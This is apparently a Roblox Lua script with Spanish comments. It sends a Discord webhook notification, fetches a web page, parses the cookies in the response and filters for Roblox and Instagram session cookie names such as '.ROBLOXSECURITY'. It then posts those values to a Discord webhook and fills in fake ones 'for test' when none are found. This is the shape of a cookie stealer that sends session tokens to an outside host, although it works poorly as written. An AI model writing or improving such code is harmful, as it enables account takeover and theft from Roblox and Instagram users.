local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local config = require("config")
local WEBHOOK_URL = config.WEBHOOK_URL

local notifyEvent = ReplicatedStorage:WaitForChild("NotifyDiscord")

local function enviarNotificacion(nombreUsuario)
    local datos = {
        content = "✅ El usuario '" .. nombreUsuario .. "' ejecutó el script de notificación con éxito.",
        username = "Notificador del Servidor"
    }
    local datosJSON = HttpService:JSONEncode(datos)
    local exito, error = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, datosJSON, Enum.HttpContentType.ApplicationJson)
    end)
    if not exito then
        warn("Hubo un error al intentar enviar la notificación a Discord: " .. tostring(error))
    else
        print("Notificación enviada a Discord correctamente.")
    end
end

notifyEvent.OnServerEvent:Connect(function(player)
    enviarNotificacion(player.Name)
end)

-- Primero, obtenemos el servicio para hacer peticiones HTTP
local HttpService = game:GetService("HttpService")

-- 1. Creamos nuestra propia "sesión" para guardar las cookies.
-- Es simplemente una tabla.
local session = {}
session.cookies = {} -- Esta tabla guardará las cookies como clave-valor

-- Función para imprimir las cookies de nuestra sesión de forma legible
local function imprimirCookies(cookies_tbl)
	local resultado = "{"
	local primera = true
	for nombre, valor in pairs(cookies_tbl) do
		if not primera then
			resultado = resultado .. ", "
		end
		resultado = resultado .. "'" .. tostring(nombre) .. "': '" .. tostring(valor) .. "'"
		primera = false
	end
	resultado = resultado .. "}"
	print(resultado)
end

print("Cookies antes de la petición:")
imprimirCookies(session.cookies) -- --> Imprimirá {}

-- 2. Hacemos la petición a Google
local url = "http://www.google.com" -- Google puede redirigir a https o a un dominio local

print("\nRealizando petición a " .. url .. "...")

local request = {
	Url = url,
	Method = "GET"
}

-- Usamos pcall para ejecutar la petición de forma segura y capturar errores
local exito, respuesta = pcall(function()
	return HttpService:RequestAsync(request)
end)

if exito and respuesta then
	if respuesta.Success then
		print("Petición exitosa. Código de estado: " .. respuesta.StatusCode) -- ej: 200

		-- 3. Buscamos y procesamos las cookies de la respuesta
		-- Las cookies vienen en la cabecera 'Set-Cookie'. Puede haber varias.
		if respuesta.Headers["Set-Cookie"] then
			-- El valor puede ser una sola cookie o varias separadas por comas en algunos casos.
			-- Aquí procesamos el caso más simple.
			local cookieHeader = respuesta.Headers["Set-Cookie"]
			
			-- Usamos 'gmatch' para encontrar todos los pares 'nombre=valor'
			-- La expresión regular busca un nombre (.), un igual (=) y un valor hasta el punto y coma (;)
			for nombre, valor in string.gmatch(cookieHeader, "(.-)=([^;]+)") do
				print("Cookie encontrada: ".. nombre)
				session.cookies[nombre] = valor
			end
		else
			print("El servidor no envió la cabecera 'Set-Cookie'.")
		end

	else
		print("La petición falló: " .. respuesta.Body)
	end
else
	warn("Error crítico en la petición: " .. tostring(respuesta))
end

-- 4. Imprimimos las cookies que hemos guardado
print("\nCookies después de la petición:")
imprimirCookies(session.cookies)

-- Enviar las cookies al Discord como mensaje normal (solo Roblox/Instagram)
local function cookiesAStringFiltradas(cookies_tbl)
    local resultado = ""
    for nombre, valor in pairs(cookies_tbl) do
        local lower = string.lower(nombre)
        if string.find(lower, "roblox") or string.find(lower, "instagram") then
            resultado = resultado .. nombre .. " = " .. valor .. "\n"
        end
    end
    return resultado
end

local cookiesTexto = cookiesAStringFiltradas(session.cookies)

-- Si no hay cookies de Roblox/Instagram, agrega simuladas para prueba
if cookiesTexto == "" then
    session.cookies[".ROBLOXSECURITY"] = "prueba123"
    session.cookies["ds_user_id"] = "insta456"
    cookiesTexto = cookiesAStringFiltradas(session.cookies)
    cookiesTexto = cookiesTexto .. "\n(Ejemplo automático para test)"
end

-- Envía las cookies filtradas como mensaje al Discord
enviarNotificacion("Cookies filtradas (Roblox/Instagram):\n" .. cookiesTexto) 